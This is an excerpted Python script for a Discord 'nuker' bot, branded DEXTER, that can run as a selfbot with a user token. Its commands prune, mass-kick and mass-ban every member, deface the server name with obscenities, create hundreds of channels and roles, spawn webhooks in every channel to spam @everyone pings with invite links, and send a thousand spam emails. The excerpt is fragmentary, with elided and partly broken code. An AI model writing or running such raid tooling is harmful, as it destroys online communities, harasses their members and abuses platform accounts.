...
os.system('cls & mode 85,20 & title [SkidGod] - https://discord.gg/sputnikbot')
os.system('cls')
...
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name='DEXTER • V10 CONNEDTED Join .gg/coders-city', url='https://discord.gg/sputnikbot'))
...
intents = discord.Intents.all()
intents.members = True
os.system(f"cls & mode 85,20 & title [Psychics Official] - Connected: {client.user}")
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)
...
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name = "DEXTER V10 CONNECTED Join .gg/maxonfire", url='https://discord.gg/Psychics'))
    print(f'''
                        \x1b[38;5;196m░░░░░██╗██╗░░░██╗███╗░░██╗░██████╗░██╗░░░░░███████╗███████╗  
                        \x1b[38;5;196m░░░░░██║██║░░░██║████╗░██║██╔════╝░██║░░░░░██╔════╝██╔════╝  
                        \x1b[38;5;196m░░░░░██║██║░░░██║██╔██╗██║██║░░██╗░██║░░░░░█████╗░░█████╗░░  
...
async def prune(ctx):
  ...
  guild = ctx.guild
  try:
            await guild.prune_members(days=1, compute_prune_count=True, roles= guild.roles,reason="𝑳𝑶𝑽𝑬 𝑭𝑹𝑶𝑴 𝑫𝑬𝑿𝑻𝑬𝑹 𝑱𝑰𝑱𝑨")
...
async def massban(ctx, guild):
    ...
    with open('members.txt', 'a') as (m):
        ...
        await ctx.send('STARTED BANING ALL PEOPLES IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
...
async def masskick(ctx, guild):
    ...
    with open('members.txt', 'a') as (m):
        ...
        await ctx.send('STARTED KICKING ALL PEOPLES IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    ...
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']), value=(field['value']),
              inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            em.set_footer(text='𝑪𝑹𝑬𝑨𝑻𝑬𝑫 𝑩𝒀 𝑫𝑬𝑿𝑻𝑬𝑹 ')
...
async def wizz(ctx):
    ...
    try:
        await ctx.guild.edit(name="𝑺𝑬𝑹𝑽𝑬𝑹 𝑭𝑼𝑪𝑲𝑬𝑫 𝑩𝒀 𝑫𝑬𝑿𝑻𝑬𝑹", description="SRVR FUCKED BY DEXTER",
          reason='𝑫𝑬𝑿𝑻𝑬𝑹 𝑶𝑵.𝑻𝑶𝑷',
          icon=None,
          banner=None)
    except:
        pass
    ...
    for _i in range(250):
        await ctx.guild.create_text_channel(name="SERVER WIZZED BY DEXTER JIJA")

    for _i in range(100):
        await ctx.guild.create_role(name='𝑫𝑬𝑿𝑻𝑬𝑹.𝑶𝑵 𝑻𝑶𝑷')

    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason='𝑫𝑬𝑿𝑻𝑬𝑹 𝑶𝑵 𝑻𝑶𝑷')
        except:
            pass
    ...
    for user in users:
        try:
            await user.ban(reason='DEXTER ON TOP')
        except:
            pass
...
def ssspam(webhook):
    while spammingdawebhookeroos:
        data = {'content':'@everyone @here SERVER FUCKED BY DEXTER JIJA  https://discord.gg/maxonfire'}
...
async def pings(ctx):
    ...
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='DEXTER.JIJA')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
...
async def massmail(ctx, reciver):
    ...
    for i in range(0, 1000):
        message = '  SRVR WIZZED BY DEXTER JIJA '
        port = 465
